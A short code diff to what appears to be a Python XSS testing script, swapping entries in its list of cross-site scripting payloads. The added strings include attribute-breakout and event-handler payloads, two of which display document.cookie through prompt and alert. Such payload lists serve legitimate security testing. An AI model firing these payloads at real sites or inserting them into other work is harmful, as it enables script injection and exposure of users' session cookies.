@@ -13,9 +13,12 @@ reset = Fore.RESET
 
 payloads = [
     "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert('XSS')>",
+    "<Img Src=OnXSS OnError=confirm(1337)>",
     "<svg/onload=alert('XSS')>",
-    "javascript:alert('XSS')>",
+    '"><svg onload=alert(1)>',
+    '" onmouseover="alert(1)" x="',
+    '<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">',
+    '" autofocus onfocus="alert(document.cookie)" x="',
     "<body onload=alert('XSS')>",
 ]
 
